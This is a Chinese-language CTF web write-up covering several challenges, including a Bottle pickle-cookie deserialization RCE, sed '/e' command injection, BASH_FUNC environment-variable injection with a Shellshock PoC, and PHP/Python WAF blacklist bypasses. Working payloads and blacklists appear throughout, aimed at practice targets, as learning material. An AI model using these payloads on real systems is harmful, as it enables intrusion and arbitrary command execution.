alert(_0x324fcb(0x2d9,0x2c3,0x2db,0x2f3)+'k3r_h0pe_t'+_0xe4a674(0x5a1,0x595,0x59e,0x57c)+'irlfriend}')
```

就可以获得flag

#### [羊城杯 2020]easycon

dirsearch扫描，扫描到index.php，点进去弹出`eval post cmd`

直接用post传

![image-20250303161959410](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250226191453561.png)

读取bbbbbbbbb.txt就有flag了

#### ctfhub-网站源码

记录一下

![image-20250318153521218](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250318153521218.png)

#### ctfhub-Git泄露

1. **log**

这题考的是git泄露，dirsearch扫出来泄露

![image-20250318185532922](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250318185532922.png)

然后使用提示的Githack工具

```
python2 GitHack.py http://challenge-985393f2a8e1a2f2.sandbox.ctfhub.com:10800/.git
```

最后得到的会存在dist文件夹中

![image-20250318185942172](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250318185942172.png)

在对应的文件夹中打开git gui

![image-20250318190027170](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250318190027170.png)

```
git reset --hard fb94b8c3bee7399cdee9ce9e497998c3479cdeea
```

![image-20250318190038162](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250318190038162.png)

回到对应版本，就在文件夹中找到flag

2. **stash**

这个前面的步骤是一样的，只是恢复log文件不行了，根据题目找到

```
 git stash pop
```

![image-20250318190840002](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250318190840002.png)

stash是用来储存的，而这个命令是用来恢复原来的缓存的工作目录

#### [XYCTF2025]signin

有源码

```python
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)



```

可以用download实现文件读，但是有限制

一开始先读secret.txt

```
/download?filename=./.././../secret.txt
```

> 代码限制了不能有 `../../` 连在一起，不能以 `../` `/` 开头
>
> `./` 代表当前目录，用这个分割

![image-20250406101148755](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250406101148755.png)

然后是一个知识点

> **Bottle**的cookie处理机制
>
> 当设置cookie时，Bottle会执行以下步骤
> 1.序列化数据，默认使用pickle将数据序列化为字节流
> 2.base64编码，生成 `data_b64`
> 3.使用secret对数据计算`HMAC-SHA256`签名，生成 `signature_b64`
> 4.将数据组合起来 `data_b64 + "?" + signature_b64`
>
> ```python
> response.set_cookie("name", data, secret=secret)
> ```
>
> 读取cookie时
> 1.检测cookie是否包含问号，将其分割成 `signature_b64` 和 `data_b64`
> 2.使用secret重新计算 `data_b64`  的 HMAC ，与 `signature_b64` 对比
> 3.签名验证通过后，将 `data_b64` 解码并进行 `pickle` 反序列化
>
> ```python
> session = request.get_cookie("name", secret=secret)
> ```

利用的漏洞就是这个pickle反序列化

直接用他给的源码起个环境，**直接将pickle对象当作cookie的值**，然后再使用这个cookie访问网站
测试过程发现这个是无回显的，刚好download有个任意文件读，就将文件写入就行

```python
from bottle import Bottle, request, response, redirect, static_file, run, route

secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"
app = Bottle()

class person():
    def __reduce__(self):
        return (eval, ("print(__import__('os').popen('ls / > ../../1.txt').read())",))

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        print(session)
        if not session or session["name"] == "guest":
            session = {"name": person()}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='127.0.0.1', port=8080, debug=False)
```

#### [NCTF 2023]Webshell Generator

打开题目，会生成一个php webshell，网页上没看到东西，打开bp抓抓包

![image-20250410150350655](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410150350655.png)

一个根据key生成一个php，然后重定向到 download.php 下载

![image-20250410150444980](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410150444980.png)

![image-20250410150535879](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410150535879.png)

写题时的思路是写东西到这个php中，看看能不能访问执行或者用蚁剑什么的，前端有一点限制，抓包传就行

但是访问这个download一直读不到，尝试用这个进行文件读，确实能读到

![image-20250410151131977](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410151131977.png)

download.php

```php
<?php

if(isset($_GET['file']) && isset($_GET['filename'])){
    $file = $_GET['file'];
    $filename = $_GET['filename'];
    header("Content-type: application/octet-stream");
    header("Content-Disposition: attachment; filename=$filename");
    readfile($file);
    exit();
}
```

index.php

```php
<?php
function security_validate()
{
    foreach ($_POST as $key => $value) {
        if (preg_match('/\r|\n/', $value)) {
            die("$key 不能包含换行符！");
        }
        if (strlen($value) > 114) {
            die("$key 不能超过114个字符！");
        }
    }
}
security_validate();
if (@$_POST['method'] && @$_POST['key'] && @$_POST['filename']) {
    if ($_POST['language'] !== 'PHP') {
        die("PHP是最好的语言");
    }
    $method = $_POST['method'];
    $key = $_POST['key'];
    putenv("METHOD=$method") or die("你的method太复杂了！");
    putenv("KEY=$key") or die("你的key太复杂了！");
    $status_code = -1;
    $filename = shell_exec("sh generate.sh");
    if (!$filename) {
        die("生成失败了！");
    }
    $filename = trim($filename);
    header("Location: download.php?file=$filename&filename={$_POST['filename']}");
    exit();
}
?>
<html>

<head>
    <title>Webshell生成器</title>
    <meta charset="utf-8">
    <style>
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
        }

        form {
            margin: 50px auto;
            width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
        }

        h1 {
            text-align: center;
            color: #333;
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: #666;
        }

        input[type="text"],
        select {
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #3e8e41;
        }
    </style>
</head>

<body>
    <form action="index.php" method="post">
        <h1>Webshell生成器</h1>
        <label for="language">Webshell语言：</label>
        <select name="language" id="method">
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
            <option value="PHP">PHP</option>
        </select>
        <label for="method">请求方法：</label>
        <select name="method" id="method">
            <option value="POST">POST</option>
            <option value="GET">GET</option>
            <option value="REQUEST">REQUEST</option>
        </select>
        <label for="key">密钥：</label>
        <input name="key" type="text" value="114" pattern="[A-Za-z0-9]+" title="你的key太复杂了！简单点！o.O">
        <label for="filename">Webshell文件名称：</label>
        <input name="filename" type="text" value="webshell.php">
        <input type="submit" value="生成你的专属Webshell！">
    </form>
</body>
```

可以看到中间有一个

```php
$filename = shell_exec("sh generate.sh");
```

generate.sh

```bash
#!/bin/sh

set -e

NEW_FILENAME=$(tr -dc a-z0-9 </dev/urandom | head -c 16)
cp template.php "/tmp/$NEW_FILENAME"
cd /tmp

sed -i "s/KEY/$KEY/g" "$NEW_FILENAME"
sed -i "s/METHOD/$METHOD/g" "$NEW_FILENAME"

realpath "$NEW_FILENAME"
```

> 根据ai解析了一下
>
> `set -e` ：出错就退出脚本
>
> `NEW_FILENAME=$(tr -dc a-z0-9 </dev/urandom | head -c 16)`：生成随机文件名
>
> `cp template.php "/tmp/$NEW_FILENAME"` ：将template.php  复制到tmp目录，并且用随机生成的名字
>
> `cd /tmp` ：切换过去
>
> `sed -i "s/KEY/$KEY/g" "$NEW_FILENAME"  sed -i "s/METHOD/$METHOD/g" "$NEW_FILENAME"`：
> `sed -i`：直接修改文件内容
> `"s/KEY/$KEY/g"  &  "s/METHOD/$METHOD/g"` ：最前面的s是替换标志位，将文件中的占位符修改为对应环境变量的值

后面就不是很会，查看wp发现大概是通过修改传入的值，修改 `sed` 命令的参数

发现一个执行命令的指令

```bash
sed -i 's/date/`ls`/e' file.txt
```

> `/e`：执行替换后的内容，就是 `ls` 用这个的输出替换原来的data

但是 ` 给过滤了 ，最后使用这个读取到的flag

```
NOTHING/g;e/readflag;
```

![image-20250410155628594](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410155628594.png)

![image-20250410155639228](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410155639228.png)

完整的命令应该是，这个readflag是我搜题目时发现原题是有给的

![image-20250410173114792](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410173114792.png)

```bash
sed -i "s/METHOD/NOTHING/g;e/readflag;" "$NEW_FILENAME"
```

`s/METHOD/NOTHING/g`：最后的g是替换命令s的一个标志，代表全局替换，我个人认为是为了让 sed 能识别出这是一条完整的指令，因为不加这个会报错

分号是用来执行多条指令的

`e/readflag` ：e标识是执行后面的shell命令，这个/readflag 是个可执行命令，所以就会将这个执行，得到输出，然后将输出插到这个结果中

我自己尝试的，在flag.txt中写了一个`ls`，执行这条命令之后，得到的结果

![image-20250410173656683](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410173656683.png)

![image-20250410173816597](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410173816597.png)

#### [NCTF 2022]calc

经典计算器（bushi

拿到丢bp，测试，发现爆东西了（，但是不知道session格式，不知道有什么用

![image-20250410174312712](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250410174312712.png)

查网页源码，发现一个 `/source` 路由

```python
@app.route("/calc",methods=['GET']) 

def calc(): 
    ip = request.remote_addr 
    num = request.values.get("num") 
    log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip) 
    if waf(num): 
        try: 
            data = eval(num) os.system(log) 
        except: 
            pass return str(data) 
     else: 
        return "waf!!"
```

这个是写了一个log文件，然后执行了num命令，但是有waf，而且不知道是什么

然后查了wp，主要是利用p大的一篇文章[我是如何利用环境变量注入执行任意命令 - 跳跳糖](https://tttang.com/archive/1450/)

看了有点晕乎乎的，总结一下

> p大找到的漏洞点是 php的 `system()` 函数
>
> 这个函数调用了 `popen()`
>
> ```php
> if (__posix_spawn (&((_IO_proc_file *) fp)->pid, _PATH_BSHELL, fa, 0,
>        (char *const[]){ (char*) "sh", (char*) "-c",
>        (char *) command, NULL }, __environ) != 0)
> return false;
> ```
>
> 而在源码中，这个函数最后执行的是
>
> ```bash
> sh -c commend
> ```
>
> 在里面有一个 `__environ` 他决定了传递的环境变量，让系统找到要调用命令的位置
>
> 这里p大找到了一个环境变量 `BASH_ENV` ，这个变量会在一个函数中被解析，如果修改了这个环境变量，就会在触发 `bash -c` 时解析这个变量
>
> `$(id 1>&2)` ：`$()`是会在赋值时被执行，然后 `1>&2` 将结果打印到标准错误中，就输出到终端中显示了
>
> ![image-20250414183831353](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250414183831353.png)
>
> 但是这个不能在 `sh -c` 的情况下利用
>
> p大又找到了一个新的环境变量 `BASH_FUNC_myfunc%%`
> 这个变量会在传入时去除前缀 `BASH_FUNC_` 和后缀 `%%` ，得到一个变量名，而如果传入的是 `() {` 开头的字符串将会被执行
>
> 就是根据 `BASH_FUNC_` 的值初始化一个函数，并给他名字，在  `bash -c` 时就能触发这个函数
>
> ```bash
> env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'
> ```
>
> ![image-20250415143251898](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250415143251898.png)
>
> 但是这个只适用于CentOS 7，在Bash 4.4 以后修改成了另一种
>
> ```bash
> env $'BASH_FUNC_myfunc()=() { id; }' bash -c 'myfunc'
> ```
>
> 这个 `BASH_FUNC` 变量是为了修复 `shellshock` 引入的
>
> 遇到环境变量注入的三种测试
>
> 1. bash如果没有修复 `shellshock` 漏洞，就使用`shellshock` 的poc
> 2. bash 4.4 以前：
>
> ```bash
> env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"
> ```
>
> 3. bash 4.4 及以上：
>
> ```bash
> env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
> ```

> 顺带记录一下 `shellshock` 漏洞
>
> 漏洞触发点：在bash 4.3 以及之前版本在处理有些构造的环境变量时存在漏洞，像环境变量值内的函数定义后添加多余的字符串会触发这个漏洞，利用这个漏洞绕过环境限制，以达到执行任意的shell命令
>
> 这里使用vulhub来复现，第一次用，这个还挺方便的
>
> * 下载vulhub之后，进入对应的cve文件夹，然后执行，就能启动环境
>
> ```bash
> sudo docker compose up -d 
> ```
>
> 然后进入docker容器
>
> ```bash
> docker ps -a 
> docker exec -it ID bash
> ```
>
> **bash知识**
>
> 在bash中，是可以自定义shell变量的，但是定义的是属于当前shell的局部变量，只能在这个shell中使用，即使是该进程fork出的子进程，也无法访问，但是可以用 `export` 命令将该变量转换为一个环境变量
> 这样的环境变量就是全局变量
>
> ![image-20250414193341658](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250414193341658.png)
>
> 在bash中还可以定义shell函数并将其导出为环境函数，只要用 `-f` 参数就行
>
> ![image-20250414193655638](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250414193655638.png)
>
> bash还有一种独特的方法来定义函数，通过环境变量来定义函数
> 当这个环境变量的值以字符串 `() {` 为开头时，那么该变量就会被当前bash当作一个导出函数，该函数只会在当前bash的子进程里生效
>
> ![image-20250414194251245](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250414194251245.png)
>
> **CGI基础**
> CGI是web服务器和外部程序通信的一种标准
> 这个是和这个漏洞与web相关的地方
>
> 当websever认为这个是一个CGI请求时，会调用相关的CGI程序，封装环境变量和标准输出，将这些数据传输给CGI程序，CGI会将这些处理完毕后生成HTML页面，然后通过标准输出将页面返回给webserver，webserver再传输给客户端
> 而这就要靠环境变量的协作，来进行服务器和CGI之间的数据传递
>
> CGI继承了系统的环境变量，CGI环境变量在CGI程序启动时初始化，在结束时销毁，在没有被HTTP调用时，他的环境变量几乎就是系统环境，被http调用时，会多了和http服务器、客户端等相关的内容
>
> **漏洞原理：**
>
> bash使用的环境变量通过函数名称调用，当以字符串 `() {` 为开头定义环境变量在命令中解析成函数后，bash执行后没有退出，而是继续执行后面的东西
>
> 在bash解析后之后，就会立即执行后面的内容
>
> ```bash
> () { :; };echo;/usr/bin/id;
> ```
>
> ![image-20250414195915290](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250414195915290.png)
>
> ![image-20250415141934437](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250415141934437.png)
>
> 所以在进入子进程的bash时就触发了
>
> 而在web端，由于CGI的存在，当他接收到HTTP请求时，环境变量就会新增一些内容，然后bash就会解析这些变量，如果我们在这些参数中注入恶意代码，就会触发命令
>
> ```
> () { :; };echo; echo $(/bin/ls /);
> ```
>
> ![image-20250419205642645](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250419205642645.png)
>
> **漏洞条件：**
>
> 1. 被攻击的bash环境小于等于 4.3
> 2. 攻击者可以控制环境变量
> 3. 攻击者可以打开新的bash进程
> 4. 如果是web端则需要CGI环境

所以如果代码的最底层利用的是 `bash -c` 这种语句，就可以利用这个注入方法

这里给的代码还没有waf的代码，有的wp里是有的

```python
def waf(s):
    blacklist = ['import', '(', ')', '#', '@', '^', '$', ',', '>', '?', '`', ' ', '_', '|', ';', '"', '{', '}', '&','getattr', 'os', 'system', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'subprocess','file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'config', 'local', 'self','item', 'getitem', 'getattribute', 'func_globals', '__init__', 'join', '__dict__']
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag = False
            print(no)
            break
    return flag
```

了解完这个知识点后面还有python的一些知识点（好多

1. 变量赋值

   ```python
   a = 0
   for a in [1]:
       pass
   print(a)
   ```

   这个代码重点是 `for a in [1]:` 将a重新赋值为列表中的元素，所以最后a就变成了1
   这个是用来绕过等号的
2. list生成器和中括号
   这个是python的特色写法

   ```python
   a = 0
   [[str][0]for[a]in[[1]]]
   print(a)
   ```

   `[[str][0]for[a]in[[1]]]` ：前面的 `[str][0]` 是用来构造一个str列表，重点在后面 `for[a]in[[1]]` 后面就是用来变量赋值的，`[[1]]` 其实是包裹着一个列表 [1]

   但是这个写法好像高版本已经没了，复现不出来

   但是在修改环境变量的时候反而可以![image-20250415150818503](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250415150818503.png)

所以我们的payload其实就是

```python
[[str][0]for[os.environ['BASH_FUNC_echo%%']]in[['() { id; }']]]
```

```python
[[str][0]for[os.environ['BASH_FUNC_echo()']]in[['() { id; }']]]
```

但是还有waf

这里还有一个知识点

* 只要是通过引号包裹的字符串都可以通过16进制绕过

但是还有一个 `os` 在外面，发现python有个很变态的机制，支持一些非ascii字母，可以用 `ᵒｓ` 来代替 `os`

![image-20250415153336898](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250415153336898.png)

找到一个网页[Python Unicode Variable Names | A page listing all the Unicode characters that are valid in Python variable names](https://www.asmeurer.com/python-unicode-variable-names/start-characters.html)

这个网页中标识的字符是可以用来作为变量的字符，但是不一定能用来当作函数的代替（而且这个网页太大，要加载好久

所以最后的paylaod

不知道为什么，这里一直无法反弹shell（大哭

最后是偷的nss的一个思路才做的

知道了目前这个目录的位置，然后用 `tee` 指令将数据写到文件上

```
() { cd /;ls| tee home/templates/index.html;}
```

![image-20250415163848286](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250415163848286.png)

#### [UUCTF 2022 新生赛]ez_rce

```php
<?php
## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if (!preg_match('/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i',$code)){
        echo '看看你输入的参数！！！不叫样子！！';echo '<br>';
        eval($code);
    }
    else{
        die("你想干什么？？？？？？？？？");
    }
}
else{
    echo "居然都不输入参数，可恶!!!!!!!!!";
    show_source(__FILE__);
}
```

1. 反斜杠绕过
   ![image-20250419101138952](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250419101138952.png)

   ```
   print(`c\at%20/fffffffffflagafag`);
   ```
2. 没过滤 `var_dump`
   `var_dump`：打印变量的详细信息
   `nl`：给输入的文件添加行号后发送到标准输出

   ```
   var_dump(`nl%20/f????????????????`);
   ```
